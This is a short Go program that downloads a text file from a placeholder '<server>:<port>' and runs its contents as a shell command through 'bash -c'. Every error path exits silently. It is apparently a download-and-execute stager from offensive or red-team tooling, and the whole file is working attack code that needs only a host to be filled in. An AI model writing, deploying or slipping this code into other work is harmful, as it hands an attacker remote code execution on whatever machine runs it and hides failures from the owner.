// Copyright (C) 2020 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published
// by the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package main

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	server = "<server>:<port>"
)

func main() {
	x, f := context.WithTimeout(context.Background(), time.Duration(5*time.Second))
	defer f()
	r, err := http.NewRequestWithContext(x, http.MethodGet, fmt.Sprintf("http://%s/linux.txt", server), nil)
	if err != nil {
		os.Exit(0)
	}
	b, err := http.DefaultClient.Do(r)
	if err != nil {
		os.Exit(0)
	}
	defer b.Body.Close()
	d := &bytes.Buffer{}
	io.Copy(d, b.Body)
	e := exec.Command("bash", "-c", strings.ReplaceAll(string(d.Bytes()), "\n", ""))
	if err := e.Start(); err != nil {
		os.Exit(0)
	}
	e.Wait()
}
